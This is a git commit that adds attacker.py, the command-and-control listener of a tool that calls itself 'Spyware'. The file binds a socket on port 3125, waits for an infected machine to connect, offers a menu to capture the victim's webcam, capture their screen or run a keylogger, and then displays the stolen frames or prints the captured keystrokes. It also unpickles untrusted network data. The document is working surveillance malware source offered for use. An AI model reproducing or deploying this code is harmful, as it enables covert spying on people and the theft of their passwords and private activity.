cebbe29b83fe6210d4cecbbf3c45139a62a5f361
Abdullah Naveed <45510165+AbdullahNaveed@users.noreply.github.com>
2022-05-31 21:04:32 +0500

    Add files via upload

---
+++ attacker.py
@@ -0,0 +1,90 @@
+import socket
+import sys
+import cv2
+import pickle
+import numpy as np
+import struct
+
+##############################
+#                            #
+#  Connection Establishment  #
+#                            #
+##############################
+
+
+HOST=''
+PORT=3125
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print('Socket created')
+
+s.bind((HOST,PORT))
+print('Socket bind complete')
+s.listen(10)
+print('Socket now listening')
+
+conn,addr=s.accept()
+
+
+##############################
+#                            #
+#         Interface          #
+#                            #
+##############################
+
+
+print("\n\t\tWelcome to Spyware!\n\n")
+print("Pick one option:")
+print("\t1. Access Webcam")
+print("\t2. Access Screen")
+print("\t3. KeyLogger")
+
+option = input("Option:")
+
+
+##############################
+#                            #
+#     Requesting Payload     #
+#                            #
+##############################
+
+
+conn.send(str(option).encode("utf-8"));
+
+
+#######################
+#                     #
+#  Recieving Payload  #
+#                     #
+#######################
+
+if(option == "1" or option == "2"):
+    data = b""
+    payload_size = struct.calcsize(">L")
+    print("payload_size: {}".format(payload_size))
+    while True:
+        while len(data) < payload_size:
+            print("Recv: {}".format(len(data)))
+            data += conn.recv(4096)
+
+        print("Done Recv: {}".format(len(data)))
+        packed_msg_size = data[:payload_size]
+        data = data[payload_size:]
+        msg_size = struct.unpack(">L", packed_msg_size)[0]
+        print("msg_size: {}".format(msg_size))
+        while len(data) < msg_size:
+            data += conn.recv(4096)
+        frame_data = data[:msg_size]
+        data = data[msg_size:]
+
+        frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
+        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+        cv2.imshow('ImageWindow',frame)
+        cv2.waitKey(1)
+
+elif(option == "3"):
+    while True:
+        data = conn.recv(1024).decode()
+        print(str(data))
+else:
+    None
